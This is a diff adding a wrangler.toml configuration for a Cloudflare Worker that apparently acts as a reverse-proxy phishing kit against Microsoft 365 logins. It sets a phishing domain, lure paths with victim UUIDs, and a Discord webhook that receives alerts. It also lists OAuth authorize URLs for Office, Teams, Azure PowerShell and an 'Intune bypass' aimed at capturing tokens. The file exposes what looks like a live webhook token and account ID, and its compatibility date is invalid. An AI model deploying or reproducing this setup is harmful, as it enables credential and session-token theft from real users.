@@ -1,0 +1,71 @@
+# wrangler.toml
+# THESE CAN ALL BE CHANGED AFTER DEPLOYMENT ON CF DASHBOARD > WORKER > SETTINGS
+
+name = "dev-26"
+main = "src/worker.js"     # Entry point to the Worker
+compatibility_date = "2026-22-05"  # Use today's date
+
+# Account information
+account_id = "f4deba2d283353797a807c91d959f4c8"
+workers_dev = true        # Set to false if deploying to a custom domain
+
+# Don't scrub comments, as much as you can..
+minify = false
+
+# Logging
+[observability.logs]
+enabled = true
+
+# Env Variables
+[vars]
+ALLOWED_IPS = ""
+LOCAL_PHISHING_DOMAIN = "chaise-compact.online"
+# --- Alerting ---
+# Supports: Slack, Discord, Teams, or any generic webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1468337636098707691/mTKP1n5eTFx0O3ZgIBXPHCFrnSUD2TQULbtambbiiogJfWrayUeekHz9bbb0981kj3mU"
+# WEBHOOK_URL = "https://webhook.site/YOUR_GENERIC_WEBHOOK_btw_webhook_site_for_testing_only"
+
+# --- Debugging ---
+DEBUGGING="true"
+
+# ---- IP Confs ---
+# Leaving this empty or unset(meaning, fallback to default) means world visitable, i.e. what you'd expect in prod
+# ALLOWED_IPS=""
+# ALLOWED_IPS="127.0.0.1"
+
+# ---- Client Settings ---
+# CLIENT_TENANT="www.client.com"
+# uncomment to set the initial login page to the client's
+CLIENT_TENANT = "chaise-compact.online"
+# uncomment to customise where you send the user to after auth is complete
+FINAL_REDIR = "https://office.com"
+UNAUTH_REDIR = "https://office.com"
+
+# ---- Lure Settings ---
+# /verifyme?uuid=<uuid>   would be the default lure path if you don't change the below
+LURE_PATH = "/verifyme"
+LURE_PARAM = "userid"
+LURE_UUID = "96afbe36-c67b-4dcb-afe1-a73014c0bba6, 3648df07-6967-4a49-9297-f1bf8d356267, 6ee8456d-b6f8-464a-b00e-eb8b24d2734f, 78523c51-69aa-4132-82b3-0fecbacc0a6d, 440f8599-06e6-47c3-ac93-99992eb97e8b, 4eaf9c37-d62e-4757-baea-20754341846e, 2a9e8fd9-7956-47fb-890f-c7c6647a737a, 4244dcab-5577-4eb3-887c-ad0188e6ffe8, 2366a22f-a333-4ae8-80bb-65f8b04e3228, 8d9b6361-04e7-4ce8-a24c-43bf899c6693, 852805e3-2238-4136-99de-ce5a3f29fb33, 4bfe7886-ed6e-48a0-bcbb-56815714ee4e, 8a2e3008-4307-4479-b9db-a5dd185852cc, dfa69c3e-0e41-4803-b436-e60891b5d6c4, 93091197-e278-4b1a-bd50-d6a562f8aeba, 64fb7ffe-c2b0-403f-801d-3940dd17a677, 6c6637eb-9269-466d-be19-196e36172e5e, f240aa44-e8d4-400c-a655-dc51d8581d92, a60238d8-703d-4a4f-a2af-b95d89dcb4b6, e1fb8c61-ed44-4507-9f4f-68ba2f63bd11"
+
+# ---- Custom Signin URL & Redirection ---
+UPSTREAM_PATH = "/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145"
+
+# uncomment for office.com (officeHome)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145'
+
+# uncomment for Azure PowerShell (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# uncomment for Teams (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# uncomment for Intune bypass (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# ---- Custom User Agent --
+# would fall back to proxying the user's UA if commented out
+CUSTOM_USER_AGENT='proxypizza/1.0 For_Authorised_Testing_Only'
+# CUSTOM_USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15'
+# CUSTOM_USER_AGENT='Mozilla/5.0 Cloudflare is collecting our activities as threat intel'
+
+
